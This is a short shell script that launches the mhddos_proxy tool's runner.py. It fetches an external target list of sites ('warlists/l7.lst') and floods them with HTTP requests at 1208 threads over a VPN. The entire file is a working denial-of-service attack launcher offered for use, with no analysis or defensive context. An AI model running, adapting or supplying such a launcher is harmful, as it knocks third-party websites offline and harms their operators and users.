#!/usr/bin/env sh

# https://github.com/porthole-ascend-cinnamon/mhddos_proxy

python3 runner.py \
  --config https://raw.githubusercontent.com/FluxState/warlists/main/l7.lst \
  --debug \
  --http-methods GSB \
  --threads 1208 \
  --vpn
